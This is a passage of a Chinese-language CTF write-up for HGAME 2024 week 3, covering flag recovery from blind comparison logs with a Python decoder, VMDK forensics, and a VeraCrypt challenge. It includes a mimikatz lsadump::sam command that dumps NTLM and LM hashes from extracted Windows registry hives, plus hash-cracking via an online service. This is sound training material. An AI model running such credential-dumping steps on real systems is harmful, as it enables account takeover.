class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line">data[-1]&gt;ord(63):True </span><br><span class="line">data[-1]&gt;ord(95):True </span><br><span class="line">data[-1]&gt;ord(111):True </span><br><span class="line">data[-1]&gt;ord(119):True </span><br><span class="line">data[-1]&gt;ord(123):True </span><br><span class="line">data[-1]&gt;ord(125):False </span><br><span class="line">data[-1]&gt;ord(124):True </span><br><span class="line">data[-2]&gt;ord(63):True </span><br><span class="line">data[-2]&gt;ord(95):True </span><br><span class="line">data[-2]&gt;ord(111):False </span><br><span class="line">data[-2]&gt;ord(103):False </span><br><span class="line">data[-2]&gt;ord(99):True </span><br><span class="line">data[-2]&gt;ord(101):True </span><br><span class="line">data[-2]&gt;ord(102):False </span><br><span class="line">data[-3]&gt;ord(63):False </span><br><span class="line">data[-3]&gt;ord(31):True </span><br><span class="line">data[-3]&gt;ord(47):True </span><br><span class="line">data[-3]&gt;ord(55):False </span><br><span class="line">data[-3]&gt;ord(51):False </span><br><span class="line">data[-3]&gt;ord(49):True </span><br><span class="line">data[-3]&gt;ord(50):False </span><br><span class="line">data[-4]&gt;ord(63):True </span><br><span class="line">data[-4]&gt;ord(95):True </span><br><span class="line">data[-4]&gt;ord(111):False </span><br><span class="line">data[-4]&gt;ord(103):False </span><br><span class="line">data[-4]&gt;ord(99):True </span><br><span class="line">data[-4]&gt;ord(101):True </span><br><span class="line">data[-4]&gt;ord(102):False </span><br><span class="line">data[-5]&gt;ord(63):True </span><br><span class="line">data[-5]&gt;ord(95):True </span><br><span class="line">data[-5]&gt;ord(111):False </span><br><span class="line">data[-5]&gt;ord(103):False </span><br><span class="line">data[-5]&gt;ord(99):False </span><br><span class="line">data[-5]&gt;ord(97):False </span><br><span class="line">data[-5]&gt;ord(96):True </span><br><span class="line">data[-6]&gt;ord(63):False </span><br><span class="line">data[-6]&gt;ord(31):True </span><br><span class="line">data[-6]&gt;ord(47):True </span><br><span class="line">data[-6]&gt;ord(55):True </span><br><span class="line">data[-6]&gt;ord(59):False </span><br><span class="line">data[-6]&gt;ord(57):False </span><br><span class="line">data[-6]&gt;ord(56):False </span><br><span class="line">data[-7]&gt;ord(63):False </span><br><span class="line">data[-7]&gt;ord(31):True </span><br><span class="line">data[-7]&gt;ord(47):True </span><br><span class="line">data[-7]&gt;ord(55):False </span><br><span class="line">data[-7]&gt;ord(51):False </span><br><span class="line">data[-7]&gt;ord(49):True </span><br><span class="line">data[-7]&gt;ord(50):False </span><br><span class="line">data[-8]&gt;ord(63):False </span><br><span class="line">data[-8]&gt;ord(31):True </span><br><span class="line">data[-8]&gt;ord(47):True </span><br><span class="line">data[-8]&gt;ord(55):True </span><br><span class="line">data[-8]&gt;ord(59):False </span><br><span class="line">data[-8]&gt;ord(57):False </span><br><span class="line">data[-8]&gt;ord(56):True </span><br><span class="line">data[-9]&gt;ord(63):False </span><br><span class="line">data[-9]&gt;ord(31):True </span><br><span class="line">data[-9]&gt;ord(47):True </span><br><span class="line">data[-9]&gt;ord(55):False </span><br><span class="line">data[-9]&gt;ord(51):True </span><br><span class="line">data[-9]&gt;ord(53):False </span><br><span class="line">data[-9]&gt;ord(52):True </span><br><span class="line">data[-10]&gt;ord(63):True </span><br><span class="line">data[-10]&gt;ord(95):True </span><br><span class="line">data[-10]&gt;ord(111):False </span><br><span class="line">data[-10]&gt;ord(103):False </span><br><span class="line">data[-10]&gt;ord(99):False </span><br><span class="line">data[-10]&gt;ord(97):True </span><br><span class="line">data[-10]&gt;ord(98):True </span><br><span class="line">data[-11]&gt;ord(63):False </span><br><span class="line">data[-11]&gt;ord(31):True </span><br><span class="line">data[-11]&gt;ord(47):True </span><br><span class="line">data[-11]&gt;ord(55):True </span><br><span class="line">data[-11]&gt;ord(59):False </span><br><span class="line">data[-11]&gt;ord(57):False </span><br><span class="line">data[-11]&gt;ord(56):False </span><br><span class="line">data[-12]&gt;ord(63):False </span><br><span class="line">data[-12]&gt;ord(31):True </span><br><span class="line">data[-12]&gt;ord(47):True </span><br><span class="line">data[-12]&gt;ord(55):False </span><br><span class="line">data[-12]&gt;ord(51):False </span><br><span class="line">data[-12]&gt;ord(49):True </span><br><span class="line">data[-12]&gt;ord(50):True </span><br><span class="line">data[-13]&gt;ord(63):True </span><br><span class="line">data[-13]&gt;ord(95):True </span><br><span class="line">data[-13]&gt;ord(111):False </span><br><span class="line">data[-13]&gt;ord(103):False </span><br><span class="line">data[-13]&gt;ord(99):True </span><br><span class="line">data[-13]&gt;ord(101):False </span><br><span class="line">data[-13]&gt;ord(100):False </span><br><span class="line">data[-14]&gt;ord(63):False </span><br><span class="line">data[-14]&gt;ord(31):True </span><br><span class="line">data[-14]&gt;ord(47):False </span><br><span class="line">data[-14]&gt;ord(39):True </span><br><span class="line">data[-14]&gt;ord(43):True </span><br><span class="line">data[-14]&gt;ord(45):False </span><br><span class="line">data[-14]&gt;ord(44):True </span><br><span class="line">data[-15]&gt;ord(63):False </span><br><span class="line">data[-15]&gt;ord(31):True </span><br><span class="line">data[-15]&gt;ord(47):True </span><br><span class="line">data[-15]&gt;ord(55):False </span><br><span class="line">data[-15]&gt;ord(51):True </span><br><span class="line">data[-15]&gt;ord(53):True </span><br><span class="line">data[-15]&gt;ord(54):False </span><br><span class="line">data[-16]&gt;ord(63):True </span><br><span class="line">data[-16]&gt;ord(95):True </span><br><span class="line">data[-16]&gt;ord(111):False </span><br><span class="line">data[-16]&gt;ord(103):False </span><br><span class="line">data[-16]&gt;ord(99):False </span><br><span class="line">data[-16]&gt;ord(97):True </span><br><span class="line">data[-16]&gt;ord(98):True </span><br><span class="line">data[-17]&gt;ord(63):True </span><br><span class="line">data[-17]&gt;ord(95):True </span><br><span class="line">data[-17]&gt;ord(111):False </span><br><span class="line">data[-17]&gt;ord(103):False </span><br><span class="line">data[-17]&gt;ord(99):False </span><br><span class="line">data[-17]&gt;ord(97):False </span><br><span class="line">data[-17]&gt;ord(96):True </span><br><span class="line">data[-18]&gt;ord(63):True </span><br><span class="line">data[-18]&gt;ord(95):True </span><br><span class="line">data[-18]&gt;ord(111):False </span><br><span class="line">data[-18]&gt;ord(103):False </span><br><span class="line">data[-18]&gt;ord(99):False </span><br><span class="line">data[-18]&gt;ord(97):True </span><br><span class="line">data[-18]&gt;ord(98):False </span><br><span class="line">data[-19]&gt;ord(63):False </span><br><span class="line">data[-19]&gt;ord(31):True </span><br><span class="line">data[-19]&gt;ord(47):False </span><br><span class="line">data[-19]&gt;ord(39):True </span><br><span class="line">data[-19]&gt;ord(43):True </span><br><span class="line">data[-19]&gt;ord(45):False </span><br><span class="line">data[-19]&gt;ord(44):True </span><br><span class="line">data[-20]&gt;ord(63):False </span><br><span class="line">data[-20]&gt;ord(31):True </span><br><span class="line">data[-20]&gt;ord(47):True </span><br><span class="line">data[-20]&gt;ord(55):True </span><br><span class="line">data[-20]&gt;ord(59):False </span><br><span class="line">data[-20]&gt;ord(57):False </span><br><span class="line">data[-20]&gt;ord(56):False </span><br><span class="line">data[-21]&gt;ord(63):False </span><br><span class="line">data[-21]&gt;ord(31):True </span><br><span class="line">data[-21]&gt;ord(47):True </span><br><span class="line">data[-21]&gt;ord(55):True </span><br><span class="line">data[-21]&gt;ord(59):False </span><br><span class="line">data[-21]&gt;ord(57):False </span><br><span class="line">data[-21]&gt;ord(56):True </span><br><span class="line">data[-22]&gt;ord(63):True </span><br><span class="line">data[-22]&gt;ord(95):True </span><br><span class="line">data[-22]&gt;ord(111):False </span><br><span class="line">data[-22]&gt;ord(103):False </span><br><span class="line">data[-22]&gt;ord(99):True </span><br><span class="line">data[-22]&gt;ord(101):False </span><br><span class="line">data[-22]&gt;ord(100):True </span><br><span class="line">data[-23]&gt;ord(63):False </span><br><span class="line">data[-23]&gt;ord(31):True </span><br><span class="line">data[-23]&gt;ord(47):True </span><br><span class="line">data[-23]&gt;ord(55):False </span><br><span class="line">data[-23]&gt;ord(51):True </span><br><span class="line">data[-23]&gt;ord(53):False </span><br><span class="line">data[-23]&gt;ord(52):False </span><br><span class="line">data[-24]&gt;ord(63):False </span><br><span class="line">data[-24]&gt;ord(31):True </span><br><span class="line">data[-24]&gt;ord(47):False </span><br><span class="line">data[-24]&gt;ord(39):True </span><br><span class="line">data[-24]&gt;ord(43):True </span><br><span class="line">data[-24]&gt;ord(45):False </span><br><span class="line">data[-24]&gt;ord(44):True </span><br><span class="line">data[-25]&gt;ord(63):False </span><br><span class="line">data[-25]&gt;ord(31):True </span><br><span class="line">data[-25]&gt;ord(47):True </span><br><span class="line">data[-25]&gt;ord(55):False </span><br><span class="line">data[-25]&gt;ord(51):True </span><br><span class="line">data[-25]&gt;ord(53):False </span><br><span class="line">data[-25]&gt;ord(52):True </span><br><span class="line">data[-26]&gt;ord(63):False </span><br><span class="line">data[-26]&gt;ord(31):True </span><br><span class="line">data[-26]&gt;ord(47):True </span><br><span class="line">data[-26]&gt;ord(55):False </span><br><span class="line">data[-26]&gt;ord(51):False </span><br><span class="line">data[-26]&gt;ord(49):True </span><br><span class="line">data[-26]&gt;ord(50):False </span><br><span class="line">data[-27]&gt;ord(63):False </span><br><span class="line">data[-27]&gt;ord(31):True </span><br><span class="line">data[-27]&gt;ord(47):True </span><br><span class="line">data[-27]&gt;ord(55):False </span><br><span class="line">data[-27]&gt;ord(51):True </span><br><span class="line">data[-27]&gt;ord(53):True </span><br><span class="line">data[-27]&gt;ord(54):True </span><br><span class="line">data[-28]&gt;ord(63):False </span><br><span class="line">data[-28]&gt;ord(31):True </span><br><span class="line">data[-28]&gt;ord(47):True </span><br><span class="line">data[-28]&gt;ord(55):False </span><br><span class="line">data[-28]&gt;ord(51):False </span><br><span class="line">data[-28]&gt;ord(49):False </span><br><span class="line">data[-28]&gt;ord(48):True </span><br><span class="line">data[-29]&gt;ord(63):False </span><br><span class="line">data[-29]&gt;ord(31):True </span><br><span class="line">data[-29]&gt;ord(47):False </span><br><span class="line">data[-29]&gt;ord(39):True </span><br><span class="line">data[-29]&gt;ord(43):True </span><br><span class="line">data[-29]&gt;ord(45):False </span><br><span class="line">data[-29]&gt;ord(44):True </span><br><span class="line">data[-30]&gt;ord(63):False </span><br><span class="line">data[-30]&gt;ord(31):True </span><br><span class="line">data[-30]&gt;ord(47):True </span><br><span class="line">data[-30]&gt;ord(55):False </span><br><span class="line">data[-30]&gt;ord(51):True </span><br><span class="line">data[-30]&gt;ord(53):True </span><br><span class="line">data[-30]&gt;ord(54):True </span><br><span class="line">data[-31]&gt;ord(63):True </span><br><span class="line">data[-31]&gt;ord(95):True </span><br><span class="line">data[-31]&gt;ord(111):False </span><br><span class="line">data[-31]&gt;ord(103):False </span><br><span class="line">data[-31]&gt;ord(99):True </span><br><span class="line">data[-31]&gt;ord(101):False </span><br><span class="line">data[-31]&gt;ord(100):True </span><br><span class="line">data[-32]&gt;ord(63):True </span><br><span class="line">data[-32]&gt;ord(95):True </span><br><span class="line">data[-32]&gt;ord(111):False </span><br><span class="line">data[-32]&gt;ord(103):False </span><br><span class="line">data[-32]&gt;ord(99):True </span><br><span class="line">data[-32]&gt;ord(101):True </span><br><span class="line">data[-32]&gt;ord(102):False </span><br><span class="line">data[-33]&gt;ord(63):True </span><br><span class="line">data[-33]&gt;ord(95):True </span><br><span class="line">data[-33]&gt;ord(111):False </span><br><span class="line">data[-33]&gt;ord(103):False </span><br><span class="line">data[-33]&gt;ord(99):False </span><br><span class="line">data[-33]&gt;ord(97):False </span><br><span class="line">data[-33]&gt;ord(96):True </span><br><span class="line">data[-34]&gt;ord(63):True </span><br><span class="line">data[-34]&gt;ord(95):True </span><br><span class="line">data[-34]&gt;ord(111):False </span><br><span class="line">data[-34]&gt;ord(103):False </span><br><span class="line">data[-34]&gt;ord(99):False </span><br><span class="line">data[-34]&gt;ord(97):True </span><br><span class="line">data[-34]&gt;ord(98):False </span><br><span class="line">data[-35]&gt;ord(63):True </span><br><span class="line">data[-35]&gt;ord(95):True </span><br><span class="line">data[-35]&gt;ord(111):False </span><br><span class="line">data[-35]&gt;ord(103):False </span><br><span class="line">data[-35]&gt;ord(99):False </span><br><span class="line">data[-35]&gt;ord(97):False </span><br><span class="line">data[-35]&gt;ord(96):True </span><br><span class="line">data[-36]&gt;ord(63):True </span><br><span class="line">data[-36]&gt;ord(95):True </span><br><span class="line">data[-36]&gt;ord(111):False </span><br><span class="line">data[-36]&gt;ord(103):False </span><br><span class="line">data[-36]&gt;ord(99):False </span><br><span class="line">data[-36]&gt;ord(97):True </span><br><span class="line">data[-36]&gt;ord(98):False </span><br><span class="line">data[-37]&gt;ord(63):True </span><br><span class="line">data[-37]&gt;ord(95):True </span><br><span class="line">data[-37]&gt;ord(111):False </span><br><span class="line">data[-37]&gt;ord(103):False </span><br><span class="line">data[-37]&gt;ord(99):False </span><br><span class="line">data[-37]&gt;ord(97):True </span><br><span class="line">data[-37]&gt;ord(98):True </span><br><span class="line">data[-38]&gt;ord(63):True </span><br><span class="line">data[-38]&gt;ord(95):True </span><br><span class="line">data[-38]&gt;ord(111):True </span><br><span class="line">data[-38]&gt;ord(119):True </span><br><span class="line">data[-38]&gt;ord(123):False </span><br><span class="line">data[-38]&gt;ord(121):True </span><br><span class="line">data[-38]&gt;ord(122):True </span><br><span class="line">data[-39]&gt;ord(63):True </span><br><span class="line">data[-39]&gt;ord(95):True </span><br><span class="line">data[-39]&gt;ord(111):False </span><br><span class="line">data[-39]&gt;ord(103):False </span><br><span class="line">data[-39]&gt;ord(99):True </span><br><span class="line">data[-39]&gt;ord(101):True </span><br><span class="line">data[-39]&gt;ord(102):True </span><br><span class="line">data[-40]&gt;ord(63):True </span><br><span class="line">data[-40]&gt;ord(95):True </span><br><span class="line">data[-40]&gt;ord(111):False </span><br><span class="line">data[-40]&gt;ord(103):False </span><br><span class="line">data[-40]&gt;ord(99):False </span><br><span class="line">data[-40]&gt;ord(97):False </span><br><span class="line">data[-40]&gt;ord(96):True </span><br><span class="line">data[-41]&gt;ord(63):True </span><br><span class="line">data[-41]&gt;ord(95):True </span><br><span class="line">data[-41]&gt;ord(111):False </span><br><span class="line">data[-41]&gt;ord(103):True </span><br><span class="line">data[-41]&gt;ord(107):True </span><br><span class="line">data[-41]&gt;ord(109):False </span><br><span class="line">data[-41]&gt;ord(108):False </span><br><span class="line">data[-42]&gt;ord(63):True </span><br><span class="line">data[-42]&gt;ord(95):True </span><br><span class="line">data[-42]&gt;ord(111):False </span><br><span class="line">data[-42]&gt;ord(103):False </span><br><span class="line">data[-42]&gt;ord(99):True </span><br><span class="line">data[-42]&gt;ord(101):True </span><br><span class="line">data[-42]&gt;ord(102):False </span><br><span class="line">data[-43]&gt;ord(63):False </span><br><span class="line">data[-43]&gt;ord(31):True </span><br><span class="line">data[-43]&gt;ord(47):False </span><br><span class="line">data[-43]&gt;ord(39):True </span><br><span class="line">data[-43]&gt;ord(43):True </span><br><span class="line">data[-43]&gt;ord(45):False </span><br><span class="line">data[-43]&gt;ord(44):False </span><br><span class="line">data[-44]&gt;ord(63):True </span><br><span class="line">data[-44]&gt;ord(95):True </span><br></pre></td></tr></table></figure>
+
+<p>存储到<code>meme.txt</code>中，写一个exp来自动解码flag</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">&#x27;meme.txt&#x27;</span></span><br><span class="line"><span class="comment"># 打开文件并读取其内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file_content = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_data_from_conditions</span>(<span class="params">lines</span>):</span><br><span class="line">    <span class="comment"># 用于存储每个字符位置条件的字典</span></span><br><span class="line">    conditions = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析每一行</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        parts = line.strip().split(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">        <span class="comment"># 提取位置</span></span><br><span class="line">        position = <span class="built_in">int</span>(parts[<span class="number">0</span>].split(<span class="string">&#x27;[&#x27;</span>)[-<span class="number">1</span>].split(<span class="string">&#x27;]&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 提取比较值</span></span><br><span class="line">        comparison_value = <span class="built_in">int</span>(parts[<span class="number">1</span>].split(<span class="string">&#x27;(&#x27;</span>)[-<span class="number">1</span>].split(<span class="string">&#x27;)&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 提取结果</span></span><br><span class="line">        result = parts[-<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip() == <span class="string">&quot;True&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 将条件添加到字典中</span></span><br><span class="line">        <span class="keyword">if</span> position <span class="keyword">not</span> <span class="keyword">in</span> conditions:</span><br><span class="line">            conditions[position] = []</span><br><span class="line">        conditions[position].append((comparison_value, result))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据条件解码每个字符</span></span><br><span class="line">    decoded_data = [<span class="string">&#x27;?&#x27;</span>] * <span class="built_in">len</span>(conditions)  <span class="comment"># 使用占位符初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> position, conds <span class="keyword">in</span> conditions.items():</span><br><span class="line">        <span class="keyword">for</span> ascii_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):  <span class="comment"># 可打印的ASCII范围</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(ascii_code &gt; value <span class="keyword">if</span> res <span class="keyword">else</span> ascii_code &lt;= value <span class="keyword">for</span> value, res <span class="keyword">in</span> conds):</span><br><span class="line">                <span class="comment"># 由于条件中使用的是负索引，调整位置</span></span><br><span class="line">                decoded_data[<span class="built_in">len</span>(conditions) + position] = <span class="built_in">chr</span>(ascii_code)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码&#x27;data&#x27;字符串</span></span><br><span class="line">decoded_data = decode_data_from_conditions(file_content)</span><br><span class="line"><span class="built_in">print</span>(decoded_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>flag&#123;cbabafe7-1725-4e98-bac6-d38c5928af2f&#125;</code></p>
+<h3 id="简单的vmdk取证"><a href="#简单的vmdk取证" class="headerlink" title="简单的vmdk取证"></a>简单的vmdk取证</h3><p>用7-zip打开vmdk文件可以看到文件结构，把WINDOWS\system32\config\目录下的system和sam文件提取出来破解提取ntlm值</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::sam /system:&quot;C:\Users\<span class="number">24993</span>\Desktop\vmdk\system&quot; /sam:&quot;C:\Users\<span class="number">24993</span>\Desktop\vmdk\SAM&quot;</span><br><span class="line">Domain : AWA-EE8A469B609</span><br><span class="line">SysKey : <span class="number">57</span>aeb759fdad3c39cebb787a4fe2b355</span><br><span class="line">Local SID : S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1454471165</span>-<span class="number">507921405</span>-<span class="number">682003330</span></span><br><span class="line"></span><br><span class="line">SAMKey : d8492022f59f4d5edd984d23bdeff3e3</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash LM  : ac804745ee68ebea19f10a933d4868dc</span><br><span class="line">  Hash NTLM: dac3a2930fc196001f3aeab959748448</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>e8 (<span class="number">1000</span>)</span><br><span class="line">User : HelpAssistant</span><br><span class="line">  Hash LM  : <span class="number">3</span>d71e1687ae90fb7f887cc48364e29e4</span><br><span class="line">  Hash NTLM: <span class="number">2</span>c5f92675b68aa855091ebb4108ae229</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>ea (<span class="number">1002</span>)</span><br><span class="line">User : SUPPORT_388945a0</span><br><span class="line">  Hash NTLM: f9a0ee136422ce87371cf1666e958dad</span><br></pre></td></tr></table></figure>
+
+<p>NTLM值是<code>DAC3A2930FC196001F3AEAB959748448</code></p>
+<p>利用一个md5在线破解网站得到明文密码<code>Admin1234</code><a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
+<p>所以flag就是<code>hgame&#123;DAC3A2930FC196001F3AEAB959748448_Admin1234&#125;</code></p>
+<h3 id="简单的取证-不过前十个有红包"><a href="#简单的取证-不过前十个有红包" class="headerlink" title="简单的取证,不过前十个有红包"></a><strong>简单的取证,不过前十个有红包</strong></h3><p>翻翻admin的桌面找到了veracrypt的密码</p>
+<img src="C:\Users\24993\AppData\Local\Temp\7zOC78622B5\secret_password.jpg" alt="secret_password" style="zoom: 67%;" />
+
+<p>下载veracrypt并挂载镜像得到flag</p>
+<p>flag:<code>hgame&#123;happy_new_year_her3_1s_a_redbag_key_41342177&#125;</code></p>
+<p>感谢小草时的红包&#x3D;v&#x3D;，虽然我没有领到TvT</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/avatar.jpg" alt="Ec3o">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>Ec3o
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2024/02/28/HGAME-2024-WEEK3-Writeup/" target="_blank">HGAME-2024-WEEK3-Writeup</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>我将,点燃大海！
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/2024/02/28/HGAME-2024-WEEK4-Writeup/" class="prev-prefix">« </a> 上一篇：    <a href="/2024/02/28/HGAME-2024-WEEK4-Writeup/" title="发布于 2024-02-28 10:40">HGAME-2024-WEEK4-Writeup</a>
+                        <br>
+                    
+                    
+                        <a href="/2024/02/28/HGAME-2024-WEEK2-Writeup/" class="next-prefix">» </a> 下一篇：    <a href="/2024/02/28/HGAME-2024-WEEK2-Writeup/" title="发布于 2024-02-28 10:40">HGAME-2024-WEEK2-Writeup</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+    
+ 
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>我将，点燃大海</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/avatar.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="ec3o.github.io" target="_blank"><span>Ec3o</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/Ec3o" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
